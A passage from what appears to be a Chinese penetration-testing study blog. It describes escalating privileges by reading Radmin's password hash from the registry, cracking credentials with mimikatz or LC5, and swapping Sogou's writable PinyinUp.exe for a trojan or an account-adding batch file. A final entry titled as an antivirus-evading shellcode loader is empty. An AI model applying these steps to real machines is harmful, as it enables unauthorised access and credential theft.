<h5 id="提权思路-1"><a href="#提权思路-1" class="headerlink" title="提权思路"></a>提权思路</h5><p>老版本的Radmin会<code>在注册表中保留密码的Hash值</code>，通过WEBSHELL、远程挂马读取注册表中的密码Hash值并在本地破解密码进行远程连接来达到提权目的。</p>
<h5 id="提取步骤"><a href="#提取步骤" class="headerlink" title="提取步骤"></a>提取步骤</h5><p><strong>1、获取MD5Hash值</strong></p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINESYSTEMRAdminv2<span class="number">.0</span>ServerParametersParameter<span class="comment">//默认密码注册表位置</span></span><br><span class="line">HKEY_LOCAL_MACHINESYSTEMRAdminv2<span class="number">.0</span>ServerParametersPort <span class="comment">//默认端口注册表位置</span></span><br></pre></td></tr></table></figure>

<p><strong>2、使用RadminHash进行登录</strong><br>在<code>Radmin-Hash</code>客户端输入RAdmin客户端的Hash值即可登录。<br>然后在Radmin-Hash客户端新建服务端，输入所要连接的<code>IP</code>或者扫描存活主机进行连接</p>
<p><strong>3、查看远程屏幕</strong></p>
<p>在Radmin客户端选择屏幕控制，输入Hash值即可查看远程主机屏幕。</p>
<p><strong>4、获取并破解密码</strong><br>用mimikatz解析用户密码，也可以通过上传getpw.exe文件获取用户的sam值，再通过LC5解密。</p>
<p><strong>5、登录远程桌面</strong></p>
<p>在本地打开远程桌面连接器，输入远端IP进行登录。</p>
<h4 id="第三方软件搜狗输入法提权"><a href="#第三方软件搜狗输入法提权" class="headerlink" title="第三方软件搜狗输入法提权"></a>第三方软件搜狗输入法提权</h4><h5 id="提权简介"><a href="#提权简介" class="headerlink" title="提权简介"></a>提权简介</h5><p>​            搜狗低版本输入法根目录下有一个：<strong>PinyinUp.exe</strong>是用来更新词典用的，管理员为了保存词库，有可能会把搜狗输入法安装到D盘，搜狗输入法目录默认是Everyone可读可写，搜狗每隔一段时间就会自动升级，而升级的文件是<strong>PinyinUp.exe</strong>，</p>
<p>​            由于搜狗输入法默认设置是自动更新，更新程序没有对exe做任何校验直接在输入法升级时调用运行，导致可以执行恶意代码。</p>
<h5 id="提权步骤-2"><a href="#提权步骤-2" class="headerlink" title="提权步骤"></a>提权步骤</h5><p>​         我们只要把这个文件替换为自己的远控木马，或是添加账户的批处理，等搜狗升级的时候，就可以达成我们的目的了。搜狗拼音输入法，会定时调用这个文件进行升级，用户无法禁止。</p>
<p>（很老的一个漏洞了，现在应该这种情况应该也很少见了。。。。。）</p>
<h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p><a href="https://cloud.tencent.com/developer/article/1547098" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1547098</a></p>
<p><a href="https://yqxy20.blog.csdn.net/article/details/99707033" target="_blank" rel="noopener">https://yqxy20.blog.csdn.net/article/details/99707033</a></p>
<p><a href="https://yqxy20.blog.csdn.net/article/details/99715736" target="_blank" rel="noopener">https://yqxy20.blog.csdn.net/article/details/99715736</a></p>
]]></content>
      <categories>
        <category>渗透测试学习</category>
      </categories>
      <tags>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>powershell加载shellcode免杀/goland加载shellcode</title>
    <url>/2021/08/06/powershell-jia-zai-shellcode-mian-sha/goland-jia-zai-shellcode/</url>
    <content><![CDATA[<h2 id="goland加载shellcode"><a href="#goland加载shellcode" class="headerlink" title="goland加载shellcode"></a>goland加载shellcode</h2>]]></content>
  </entry>
</search>
